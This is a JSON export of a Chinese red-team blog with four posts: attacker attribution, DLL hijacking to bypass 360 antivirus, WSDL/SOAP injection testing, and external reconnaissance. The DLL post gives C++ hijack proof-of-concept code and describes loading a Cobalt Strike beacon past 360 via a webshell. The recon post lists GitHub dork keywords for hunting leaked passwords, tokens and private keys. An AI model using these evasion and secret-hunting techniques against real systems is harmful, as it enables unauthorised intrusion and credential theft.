{"meta":{"title":"WY3507&Blog","subtitle":"","description":"","author":"WY3507","url":"http://example.com","root":"/"},"pages":[{"title":"分类","date":"2024-02-21T08:52:39.000Z","updated":"2024-02-21T08:53:17.458Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":"1 2 3"},{"title":"博客之所以诞生","date":"2024-02-21T09:01:20.000Z","updated":"2024-02-21T09:07:00.906Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"一枚红队中的菜鸡，整日浑水摸鱼，但为了提升必须学习，会在闲暇的日子分享技术分章"}],"posts":[{"title":"蓝队-溯源","slug":"蓝队-溯源","date":"2024-02-26T08:09:12.000Z","updated":"2024-02-26T09:00:13.666Z","comments":true,"path":"2024/02/26/蓝队-溯源/","permalink":"http://example.com/2024/02/26/%E8%93%9D%E9%98%9F-%E6%BA%AF%E6%BA%90/","excerpt":"","text":"含义:溯源顾名思义就是通过一些技术手段和各种信息收集的方式来寻找到我们想要的攻击人员信息，并在次过程中尽可能的寻找出人员的全部信息。但是溯源也是存在运气成分的，并不是说任何攻击IP都能溯源到人，但我们可以尽量提供一些相关信息并写好溯源报告给甲方就行。 溯源第一步：判断攻击IP类型一般我们在安全设备拿到攻击IP的时候都会想用微步在线等威胁平台去查询攻击IP的类型。 ·1 移动基站IP(即为手机热点IP） ·2 IDC服务器IP(即为云服务器厂商IP） ·3 企业专线IP（即为企业专用的网络出口） 溯源第二步：对不同IP溯源一：在拿到很多攻击IP的时候我们为了快速去寻找好溯源的IP，我们首先找云服务器IP去溯源、其次是企业专线。一般的情况我们不去看移动基站的IP，因为手机热点的IP溯源是很难溯源到人的，所以不浪费时间。 二：对于企业专线的IP可以进行简单溯源，以及使用IP定位网站进行定位，运气好可以定位到某些公司的地址，那也算是溯源到了部分信息了。 三：对于IDC服务器以及傀儡机的溯源方法我会通过另一份文档描述 溯源第三步：其他溯源方法一：通过客户在内外网的蜜罐进行溯源，很多蜜罐是可以获取一些攻击人员信息的，我们可以利用这个方法来深度溯源 二：通过查看安全设备，观察其攻击流量，在有些攻击人员在大意中会将其私密信息暴漏在攻击流量中，比如手机号之类的，要是遇到了这样的流量我们可以提取其中的信息去深度溯源。 三： 有些时候会存在钓鱼攻击的情况，那我们可以去分析其钓鱼的样本去查看它的C2服务器或者其他信息，也可以看看对方使用的是什么邮箱来钓鱼的，有些大意的攻击人员会用自己的邮箱去钓鱼，那我们就可以利用其邮箱去溯源。 四：还有一些溯源方法就不是技术手段能达到的了，比如依靠公安、服务器厂商调取注册个人信息、以及一些小的IDC厂商直接获取服务权限等方法溯源。当然这些我们不需要，只是拓展一下思路。 溯源第四步：写溯源报告一：在我们前期通过各种上述溯源思路以及别的溯源思路去溯源到信息后我们可以写溯源报告了，把整个过程完整的写清楚即可，要是没有溯源到人，就比如是傀儡机等其他情况我们也只需要把我们溯源到的信息完整的写份报告就行，毕竟溯源也是有运气成分的，所以尽力就行。 溯源所需工具及网站一：IP定位信息网站 https://website.informer.com/ https://ip.bczs.net/ https://pulsedive.com/ https://www.abuseipdb.com/ https://anti-hacker-alliance.com/ 二：ICP备案查询 https://www.beianx.cn/ https://whois.aizhan.com/ 三：威胁情报平台 https://x.threatbook.com/ https://ti.qianxin.com/ 四：资产收集平台 https://hunter.qianxin.com/ https://fofa.info/ 五：手机号注册网站查询 https://www.reg007.com/ 六：企业备案信息 https://aiqicha.baidu.com/ 七：网站回溯平台 https://archive.org/web/ 八：IP定位 https://www.opengps.cn/Data/IP/LocHighAcc.aspx 溯源文章https://blog.csdn.net/weixin_46684578&#x2F;article&#x2F;details&#x2F;114489576 https://www.sohu.com/a/417803746_658302 https://zhuanlan.zhihu.com/p/538427399 https://www.freebuf.com/articles/network/346936.html https://blog.hsm.cool/index.php/archives/771/ https://www.sec-in.com/article/1834?action=comment 溯源具体细节 PDF版 https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/blob/main/img/idc服务器溯源.pdf","categories":[{"name":"蓝队","slug":"蓝队","permalink":"http://example.com/categories/%E8%93%9D%E9%98%9F/"}],"tags":[{"name":"蓝队","slug":"蓝队","permalink":"http://example.com/tags/%E8%93%9D%E9%98%9F/"},{"name":"溯源","slug":"溯源","permalink":"http://example.com/tags/%E6%BA%AF%E6%BA%90/"}]},{"title":"DLL挖掘及突破360核晶利用","slug":"DLL挖掘及突破360核晶利用","date":"2024-02-26T07:44:38.000Z","updated":"2024-02-26T07:52:20.207Z","comments":true,"path":"2024/02/26/DLL挖掘及突破360核晶利用/","permalink":"http://example.com/2024/02/26/DLL%E6%8C%96%E6%8E%98%E5%8F%8A%E7%AA%81%E7%A0%B4360%E6%A0%B8%E6%99%B6%E5%88%A9%E7%94%A8/","excerpt":"","text":"前言随着现在防护产品的升级和大规模的普及，现在想要突破AV和EDR的防护来达到免杀上线及后续的高危操作大家跟加会去利用白加黑的方法来实现目的，而且市面上很多APT组织都会利用这种方式来入侵，为撒都会青睐这种方式呢，无非就是简单高效并且节约成本。接下来我会讲一下怎么去挖DLL的方法和利用。至于DLL劫持的原理我就不过多介绍了，相信社区的大佬们都了解。 DLL挖掘在挖掘dll时都会用到一个工具叫process monitor这个工具，这个工具可以让我们快速的去寻找能被劫持的dll，该工具可以让我们去查询软件下运行的dll，但是我们为了加快寻找速度我们可以做一些搜索限制来让我们更快的去寻找能劫持的dll，下图的红框就是我们要做的搜索限制 这里我们找个厂商来做一次测试 发现了能被劫持的dll，这里我们测试的dll 为 dbghelp.dll 但是我们去查看这个dll时发现它不存在 LoadLibraryExW 和 LoadLibraryw 函数则是无法被直接利用的，要是直接利用的话是会提示报错，这里是因为导入表和导出表的问题，我们需要将这个dll需要的函数导入进去才能利用 提示报错 接下来我们可以将需要的函数写进去就行，这里我们通过VS的dumpbin.exe去查看dbghelp.dll所需要的函数并编写POC dumpbin.exe &#x2F;imports .\\bugreport64.exe 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &quot;pch.h&quot; #include &lt;Windows.h&gt; extern &quot;C&quot; __declspec(dllexport) int StackWalk() &#123; return 0; &#125; extern &quot;C&quot; __declspec(dllexport) int SymFunctionTableAccess() &#123; return 0; &#125; extern &quot;C&quot; __declspec(dllexport) int SymCleanup() &#123; return 0; &#125; extern &quot;C&quot; __declspec(dllexport) int SymSetOptions() &#123;return 0; &#125; extern &quot;C&quot; __declspec(dllexport) int SymGetModuleInfoW() &#123; return 0; &#125; extern &quot;C&quot; __declspec(dllexport) int SymLoadModule() &#123; return 0; &#125; extern &quot;C&quot; __declspec(dllexport) int SymInitialize() &#123; return 0; &#125; extern &quot;C&quot; __declspec(dllexport) int SymGetModuleInfo() &#123; return 0; &#125; STARTUPINFO si = &#123;0&#125;; PROCESS_INFORMATION pi = &#123;0&#125;; BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) &#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: CreateProcessA(NULL, // No module name (use command line) (LPSTR)&quot;calc.exe&quot;, // Command line NULL, // Process handle not inheritable NULL, // Thread handle not inheritable FALSE, // Set handle inheritance to FALSE 0, // No creation flags NULL, // Use parent&#x27;s environment block NULL, // Use parent&#x27;s starting directory (LPSTARTUPINFOA)&amp;si, // Pointer to STARTUPINFO structure (LPPROCESS_INFORMATION)&amp;pi // Pointer to PROCESS_INFORMATION structure ); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE; &#125; 测试发现成功弹出计算器，说明这个dll是可以被我们利用的，那么我们是不是就可以利用白加黑来达到我们的一下目的呢比如免杀线上等其他操作了呢！ 但是我们可以发现该dll 是windows自带的dll，我们可以去利用everything去查看一下 但是像这些dll都会被360给标记我们可以去测试一下来个静态查杀，至于为撒会被查杀是可能360觉得你单独将这些dll放出来就会存在一些嫌疑，个人觉得哈。 测试发现你去查杀就会报毒的。 所以建议大家在挖掘dll时最好去挖一些厂商自带的dll，不是去调用windows本身的dll，这里我们测试一下，去换一个厂自带的dll去测试发现就不会报毒，测试的这个dll就不是windows自带的dll，所以360就不会去查杀它，那这样是不是对我们做免杀会更加隐秘呢？ 当然windows自带的dll也是能利用的，可能会增加一些风险。 类似这种劫持非常多，包括很多软件不是微软的dll，他们的自己的dll很多存在这些问题。 一些公开的：https://hijacklibs.net/ 这里对挖dll做个总结，我们最好是挖一些厂商自带的dll会更好一些，其挖掘方法也是和上面的思路是一样的，当然我写的方法较为简单，这里推荐大家一些文章吧 https://www.ijiandao.com/2b/baijia/418614.html https://www.seoxiehui.cn/article-353755-1.html http://tttang.com/archive/1365/ 白加黑利用场景在挖掘完能被劫持利用的dll后我们就可以利用白加黑的方式来上线我们的木马了，这里我讲了一个白加黑的利用场景，也是挺受用的。 就是我们在拿到一个webshell时都希望我们能上线到我们的CS上去，但是假如我们的目标存在360并且开了核晶时我们该怎么办上线我们的木马呢？ 有人会说通过webshell上传一个exe，去用蚁剑等工具直接去运行它不就可以上线了嘛！那真的可行嘛？毕竟这不是靶场，我们一个start x.exe 就成功上线了啊？而且我们的环境还是360加核晶的，我们也不妨来试试看能不能行嘛 这里上传了一个5.exe的马并且是做了免杀的哦，我们在桌面上去点击是可以上线的，但是问题就出来了，我们能登到目标的桌面上嘛？我们现在就一个webshell，只能通过这个webshell来上线了！ 这时我们测试发现直接运行5.exe 目标机会被360拦的，可能我们还在想是不是我们的马有问题还是wenshell管理工具有问题，其实都不是，就是我们的马被360给拦了！ 那接下来来我们该怎么办呢，这里我们就可以利用我们的白加黑来操作了，我们把我们的马放进去利用白文件加载黑dll来上线，再通过蚁剑来运行一下试试呢？ 发现通过这个方法就可以绕过360+核晶来成功上线我们的CS了 总结1.这里我们简单讲解了一下dll挖掘的方法，以及推荐大家去挖掘厂商自带的存在问题的dll会更好一些 2.在真实环境中我们会遇到很多问题，并不会像靶场一样那么简单就能上线的，这里我也讲述了一个绕过360+核晶的上线方法，就是利用我们常见的白加黑方式，这个方式会360来说非常有效，所以说白加黑还是挺有用的，当然知道社区大佬多，可能早都知道了这个方法，哈哈 应该还是有需要的兄弟吧 3.当然绕过360上线不止这一个方法了，什么利用powershell来上线360+核晶的方法也是可以的，但是也是需要绕过的，大佬们可以研究一下","categories":[{"name":"红队攻防","slug":"红队攻防","permalink":"http://example.com/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"DLL挖掘","slug":"DLL挖掘","permalink":"http://example.com/tags/DLL%E6%8C%96%E6%8E%98/"}]},{"title":"WSDL渗透测试","slug":"WSDL渗透测试","date":"2024-02-23T08:33:47.000Z","updated":"2024-02-23T10:13:53.779Z","comments":true,"path":"2024/02/23/WSDL渗透测试/","permalink":"http://example.com/2024/02/23/WSDL%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"前言通常在网站通讯中很多都会调用api接口去管理更多得信息，但是这往往会是发开人员做限制比较薄弱得地方，就可能让我们有机可乘，在一次攻防中我就遇到了这个场景 WSDL​ 有人在WebService开发的时候，特别是和第三方有接口的时候，走的是SOAP协议，然后用户（或后台）给你一个WSDL文件（或网址） ​ WSDL (Web Services Description Language,Web服务描述语言)是一种XML Application，他将Web服务描述定义为一组服务访问点，客户端可以通过这些服务访问点对包含面向文档信息或面向过程调用的服务进行访问(类似远程过程调用)。WSDL首先对访问的操作和访问时使用的请求&#x2F;响应消息进行抽象描述，然后将其绑定到具体的传输协议和消息格式上以最终定义具体部署的服务访问点。相关的具体部署的服务访问点通过组合就成为抽象的Web服务 WSDL会产生什么漏洞123456789101112131415161.Web 应用安全漏洞: sql注入 xss攻击 命令执行 越权 LDAP注入 缓冲区溢出 逻辑漏洞 等等 2.XML 相关的特殊安全漏洞: XPath注入 XQuery注入 拒绝服务攻击（SOAP 数组溢出、递归的 XML 实体声明、超大消息体） 信息泄漏（XML External Entity File Disclosure） 等等 实战测试一、 发现该站点存在WSDL网站（其实WSDL得特征还是挺明显得，但是从明面上发现没有可利用得功能点，可能经验少的人就会略过，但他不曾想到这个站点会给他带来惊喜）但是这不是WSDL的单一特征 hunter语法: web.body&#x3D;”WS-Inspection “ 二、WSDL是一个api接口我们需要利用工具或者插件去探索各个接口下的xml文档，而漏洞就是产生在这些xml文档中 我们可以直接利用burp中的插件Wsdler 安装完插件利用该插件去查看存在的xml包 发现存在xml数据包 接下来我们就可以对该数据包进行漏洞探测了，一般常见的就是sql注入和xxe了 sql注入漏洞 一般通wsdl发现的注入都是sqlserver数据库，要是又是DBA权限的话那离拿shell也不远了 xxe漏洞","categories":[{"name":"红队攻防","slug":"红队攻防","permalink":"http://example.com/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"红队-外网信息收集","slug":"外网信息收集","date":"2024-02-22T06:13:27.042Z","updated":"2024-02-23T06:26:22.730Z","comments":true,"path":"2024/02/22/外网信息收集/","permalink":"http://example.com/2024/02/22/%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"前言现在攻防演练也很频繁，也越来越不好打，但当我们在前期信息收集做的越完善时可能就会有新的发现来帮助我们突破外网边界。 域名收集根域收集123456789101112企查查 ：https://www.qcc.com/爱企查 ：https://aiqicha.baidu.com/查询旗下收购公司信息：https://www.crunchbase.com/ 这个可能更常用于src挖掘的资产收集中，查询那家单位被收购了可能被收购的公司漏洞也会要小蓝本：https://www.xiaolanben.com/钉钉企典：https://www.dingtalk.com/qidian/自动收集工具 ：ENScan_GO https://github.com/afwu/ENScan_GOASN枚举：https://bgp.he.net/AS45090#_prefixes 通过asn枚举寻找资产，但更多用于src挖掘（推荐文章：https://xz.aliyun.com/t/9455?time__1311=n4%2BxuDgD9AdGq4WqGNDQT4BIfdSW1Oit4D&amp;alichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3D9itPJUbnIjx9tjQajL2HdKKad1CgTFhTFnx8OJzqe1VKV13jzg2BpuGBSoT00Z-R%26wd%3D%26eqid%3Dc68682be000300ca0000000465d6f765）通过上述方法收集到目标的根域以及下属单位的域名 搜索引擎1234567常用的资产搜索引擎推荐鹰图：https://hunter.qianxin.com/ 新资产多但有些敏感的资产不能查看fofa：https://fofa.info/ 常用，老资产比较多时不时会发现边缘资产quake：https://quake.360.net/quake/login#/ 资产还可以敏感资产可以查看也是目前花钱最便宜的了shodan：https://www.shodan.io/ 国外资产收集平台，时不时用一下也可能会发现意外资产注：我们在搜索时一定要对目标资产用多个语法查询资产，可能就会有新的收获，比如搜索c段、域名、备案、公司名、标题、证书、全资子公司等 域名收集12345678910111213141516oneforall : https://github.com/shmilylty/OneForAll命令单个：python3 oneforall.py --target target.com run命令批量：python3 oneforall.py --targets domain.txt run也是比较常用的子域名收集工具了Sublist3r 项目地址：https://github.com/aboul3la/Sublist3r 命令：python sublist3r.py -d target.com -b -t 50 -p 80,443,21,22默认参数扫描子域名python sublist3r.py -d baidu.com 使用暴力枚举子域名python sublist3r -b -d baidu.com ksubdomain ： https://github.com/boy-hack/ksubdomainsubfinder：https://github.com/projectdiscovery/subfinderhttps://www.wolframalpha.com/ 国外子域收集网站 证书收集123https://search.censys.io/https://crt.sh/https://dnsdumpster.com/ 自动资产收集12灯塔 ：https://github.com/TophantTechnology/ARL 会自动收集目标资产并探测一些敏感目录和漏洞，因为有些系统在二级目录下所以时不时会有意外收获水泽：https://github.com/0x727/ShuiZe_0x727 谷歌&amp;Github&amp;语雀 语法通过google语法收集资产 1234567以及其他常用语法intext:&quot;© XXX版权所有&quot;site: xxx.com filetype:doc 、pdf、xlssite: xxx.com 管理、后台、系统、密码、账号 Github语法 (注：在平时收集资产时可以通过github来收集一些敏感的资产) 参考语法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&quot;token&quot; &quot;password&quot; &quot;secret&quot; &quot;passwd&quot; &quot;username&quot; &quot;key&quot; &quot;apidocs&quot; &quot;appspot&quot; &quot;auth&quot; &quot;aws\\_access&quot; &quot;config&quot; &quot;credentials&quot; &quot;dbuser&quot; &quot;ftp&quot; &quot;login&quot; &quot;mailchimp&quot; &quot;mailgun&quot; &quot;mysql&quot; &quot;pass&quot; &quot;pem private&quot; &quot;prod&quot; &quot;pwd&quot; &quot;secure&quot; &quot;ssh&quot; &quot;staging&quot; &quot;stg&quot; &quot;stripe&quot; &quot;swagger&quot; &quot;testuser&quot; &quot;jdbc&quot; extension:pem private extension:ppk private extension:sql mysql dump password extension:json api.forecast.io extension:json mongolab.com extension:yaml mongolab.com extension:ica \\[WFClient\\] Password\\= extension:avastlic “support.avast.com” extension:js jsforce conn.login extension:json googleusercontent client\\_secret “target.com” send\\_keys “target.com” password “target.com” api\\_key “target.com” apikey “target.com” jira\\_password “target.com” root\\_password “target.com” access\\_token “target.com” config “target.com” client\\_secret “target.com” user auth 语雀信息收集 可以结合目标系统以及你收集到的信息来语雀搜索敏感资料和信息，比如域名、邮箱、系统名、公司名等方法搜索 JS子域收集通过burp收集js中的根域和子域名 通过 gospider工具收集网站内js中的其他子域 链接：https://github.com/jaeles-project/gospider 通过SubDomainizer工具收集子域 https://github.com/nsonaniya2010/SubDomainizer 功能： 1.查找js文件中引用的子域 2.查找js文件中引用的云服务3.使用香农熵公式在js文件中找到潜在的敏感项它只需要一个页面，扫描js文件进行分析。 注：在我们收集资产中除了打web外，其实也可以尝试打他们的云服务，在很多时候发开会不小心将相关密钥放在js文件中，若要是有发现那也可以获得一定的分数，甚至能在云服务中发现更多有用的信息。 APP资产收集123456七麦数据：https://www.qimai.cn/ 收集目标旗下的app酷传：https://www.kuchuan.com/ 收集目标旗下的app蝉应用：https://app.chandashi.com/ 收集目标旗下的app豌豆荚：https://www.wandoujia.com/ 获取app历史版本摸瓜：https://mogua.co/ 对app反编译收集app中的敏感信息，可能会发现新的ip、域名、密钥等信息appinfoscanner：https://github.com/kelvinBen/AppInfoScanner 收集app中的敏感信息 小程序资产收集通过微信搜索相关字以及目标公司全名 端口扫描1234naabu:https://github.com/projectdiscovery/naabu 扫描全端口快Rustscan:https://github.com/RustScan/RustScan 扫描全端口快vscan:https://github.com/veo/vscan 会快速扫描资产全端口、也是漏洞扫描工具railgun：https://github.com/lz520520/railgun 多功能信息收集工具有全端口扫描功能但是扫描慢但我觉得准一点 指纹识别1234567891011121314151617ehole:https://github.com/ShiHuang-ESec/EHole 对收集的资产指纹识别，但是识别不全需要自己加指纹Ehole_magic：https://github.com/lemonlove7/EHole_magic 魔改版，好处是可以自己添加目录路径，因为现在很多系统都在二级目录下的，我们可以在平常项目中积累一些特殊的目录放置进去说不定哪天就遇到了就比如：xxljob的一些目录：/xxl-job-admin/xxl-job-admin-2.1.0/job-admin/job-admin/joblog帆软：/webroot/decision/login/webroot/webroot/decision/remote/design/channelsmartbi：/smartbi//smartbi/vision/RMIServlet 供应链资产收集在很多项目中他们的系统都会存在是第三方开发的系统，但是目标的系统不存在什么历史漏洞和弱密码，那我们就可以去收集该系统的特征去资产收集平台查询是否存在相同的站或者找到官方测试站，然后去对别的相同的站或测试站渗透测试，往往别的站或测试站就会存在弱口令等问题我们就想办法拿到测试站或相同的站的shell后拿源码去审计源码通过0day去测试我们的目标站点。该方法已经是现在攻防常走的攻击思路了，毕竟再靠历史漏洞去打真的越来越难打了，尤其是比较难的项目！ 怎么收集呢 1、通过查看网站js源码找特征去搜 2、通过查看系统图标去搜 3、搜索系统名字 参考文章： https://mp.weixin.qq.com/s/mOC5OgKRCOWCu1BpoMt6Sw https://mp.weixin.qq.com/s/S4uzxutSBAbqS3LtNlDAhQ 总结：只有前期做越好的信息收集工作可能才会有新的惊喜","categories":[{"name":"红队攻防","slug":"红队攻防","permalink":"http://example.com/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"红队","slug":"红队","permalink":"http://example.com/tags/%E7%BA%A2%E9%98%9F/"},{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]}],"categories":[{"name":"蓝队","slug":"蓝队","permalink":"http://example.com/categories/%E8%93%9D%E9%98%9F/"},{"name":"红队攻防","slug":"红队攻防","permalink":"http://example.com/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"蓝队","slug":"蓝队","permalink":"http://example.com/tags/%E8%93%9D%E9%98%9F/"},{"name":"溯源","slug":"溯源","permalink":"http://example.com/tags/%E6%BA%AF%E6%BA%90/"},{"name":"DLL挖掘","slug":"DLL挖掘","permalink":"http://example.com/tags/DLL%E6%8C%96%E6%8E%98/"},{"name":"渗透","slug":"渗透","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"红队","slug":"红队","permalink":"http://example.com/tags/%E7%BA%A2%E9%98%9F/"},{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]}